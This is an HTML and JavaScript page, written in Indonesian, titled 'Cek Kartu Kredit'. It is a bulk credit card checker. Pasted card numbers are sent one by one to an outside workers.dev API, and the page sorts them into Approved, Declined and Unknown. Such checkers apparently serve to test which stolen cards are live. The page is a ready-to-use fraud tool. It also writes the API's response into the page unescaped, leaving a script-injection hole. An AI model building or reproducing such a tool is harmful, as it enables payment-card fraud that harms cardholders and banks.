<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cek Kartu Kredit</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /* Tailwind Default Dark Mode */
    html {
      background-color: #121212;
    }
  </style>
</head>
<body class="bg-gray-900 text-white dark:bg-gray-900 dark:text-white">

  <!-- Main Container -->
  <div class="min-h-screen flex flex-col items-center justify-center p-6">

    <!-- Title -->
    <h1 class="text-4xl font-semibold mb-4">Cek Kartu Kredit</h1>
    <p class="text-lg text-gray-400 mb-6">Masukkan nomor kartu kredit yang ingin diperiksa. Pisahkan dengan koma atau baris baru.</p>

    <!-- Input Area -->
    <textarea id="cc-input" rows="6" class="w-full max-w-lg p-4 bg-gray-800 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-indigo-500" placeholder="Masukkan nomor CC..."></textarea><br>

    <!-- Check Button -->
    <button onclick="checkCC()" class="mt-4 bg-indigo-600 text-white px-6 py-3 rounded-lg hover:bg-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500">Periksa</button>

    <!-- Loading Indicator -->
    <div id="loading" class="text-indigo-400 mt-4 hidden">Memeriksa...</div>

    <!-- Filter Buttons -->
    <div id="status-filter" class="mt-6 flex space-x-4">
      <button id="approved-button" onclick="filterStatus('Approved')" class="bg-green-600 text-white py-2 px-4 rounded-lg hover:bg-green-500">Approved: 0 ✅</button>
      <button id="declined-button" onclick="filterStatus('Declined')" class="bg-red-600 text-white py-2 px-4 rounded-lg hover:bg-red-500">Declined: 0 ❌</button>
      <button id="unknown-button" onclick="filterStatus('Unknown')" class="bg-gray-600 text-white py-2 px-4 rounded-lg hover:bg-gray-500">Unknown: 0 ⚠️</button>
    </div>

    <!-- Results Table -->
    <div id="results" class="mt-6 w-full max-w-lg bg-gray-800 p-6 rounded-lg shadow-lg max-h-[400px] overflow-auto">
      <table id="results-table" class="min-w-full text-sm text-left text-gray-300">
        <thead class="bg-gray-700">
          <tr>
            <th class="py-3 px-4">Nomor Kartu</th>
            <th class="py-3 px-4">Status</th>
            <th class="py-3 px-4">Respon</th>
          </tr>
        </thead>
        <tbody id="results-table-body">
          <!-- Results will be dynamically added here -->
        </tbody>
      </table>
    </div>
  </div>

  <script>
    let approvedResults = [];
    let declinedResults = [];
    let unknownResults = [];

    async function checkCC() {
      const ccInput = document.getElementById('cc-input').value;
      const ccList = ccInput.split(/\s*,\s*|\s+/); // Pisahkan dengan koma atau spasi
      const resultsTableBody = document.getElementById('results-table-body');
      const loading = document.getElementById('loading');

      resultsTableBody.innerHTML = "";  // Clear previous results
      loading.style.display = "block";   // Show loading

      // Reset category arrays
      approvedResults = [];
      declinedResults = [];
      unknownResults = [];

      // Loop untuk pengecekan satu per satu
      for (let i = 0; i < ccList.length; i++) {
        const cc = ccList[i].trim();
        if (cc) {
          await checkSingleCC(cc);  // Pengecekan satu per satu
        }
      }

      // Menampilkan hasil default (semua status)
      showAll();

      // Kosongkan input setelah pengecekan selesai
      document.getElementById('cc-input').value = '';
      loading.style.display = "none";  // Sembunyikan loading
    }

    async function checkSingleCC(cc) {
      const url = `https://api-cc-new.marinaaqua366.workers.dev/${cc}`;  // API yang kamu sebutkan

      try {
        const response = await fetch(url);
        const result = await response.json();

        // Menyimpan hasil dalam kategori yang tepat dan mengupdate tombol filter
        if (result.status === "Approved") {
          approvedResults.push({ cc, response: result.response });
          updateButtonCount('approved', approvedResults.length);
        } else if (result.status === "Declined") {
          declinedResults.push({ cc, response: result.response });
          updateButtonCount('declined', declinedResults.length);
        } else {
          unknownResults.push({ cc, response: result.response });
          updateButtonCount('unknown', unknownResults.length);
        }
      } catch (error) {
        // Tangani error jika terjadi masalah pada request
        unknownResults.push({ cc, response: "Request failed" });
        updateButtonCount('unknown', unknownResults.length);
      }
    }

    // Fungsi untuk mengupdate jumlah di tombol filter
    function updateButtonCount(status, count) {
      if (status === 'approved') {
        document.getElementById('approved-button').innerText = `Approved: ${count} ✅`;
      } else if (status === 'declined') {
        document.getElementById('declined-button').innerText = `Declined: ${count} ❌`;
      } else if (status === 'unknown') {
        document.getElementById('unknown-button').innerText = `Unknown: ${count} ⚠️`;
      }
    }

    // Menampilkan semua hasil
    function showAll() {
      const resultsTableBody = document.getElementById('results-table-body');
      resultsTableBody.innerHTML = "";  // Clear previous results

      appendResultsToTable(approvedResults, 'Approved ✅', 'bg-green-600');
      appendResultsToTable(declinedResults, 'Declined ❌', 'bg-red-600');
      appendResultsToTable(unknownResults, 'Unknown ⚠️', 'bg-gray-600');
    }

    // Menambahkan hasil ke tabel
    function appendResultsToTable(results, statusLabel, statusColor) {
      const resultsTableBody = document.getElementById('results-table-body');
      let count = 1;
      results.forEach(result => {
        const row = document.createElement('tr');
        row.className = `border-b border-gray-600 ${statusColor}`;
        
        row.innerHTML = `
          <td class="py-3 px-4">${result.cc}</td>
          <td class="py-3 px-4">${statusLabel} ${count++}</td>
          <td class="py-3 px-4">${result.response}</td>
        `;
        
        resultsTableBody.appendChild(row);
      });
    }

    // Filter berdasarkan status
    function filterStatus(status) {
      const resultsTableBody = document.getElementById('results-table-body');
      resultsTableBody.innerHTML = "";  // Clear previous results

      if (status === 'Approved') {
        appendResultsToTable(approvedResults, 'Approved ✅', 'bg-green-600');
      } else if (status === 'Declined') {
        appendResultsToTable(declinedResults, 'Declined ❌', 'bg-red-600');
      } else if (status === 'Unknown') {
        appendResultsToTable(unknownResults, 'Unknown ⚠️', 'bg-gray-600');
      }
    }
  </script>
</body>
</html>
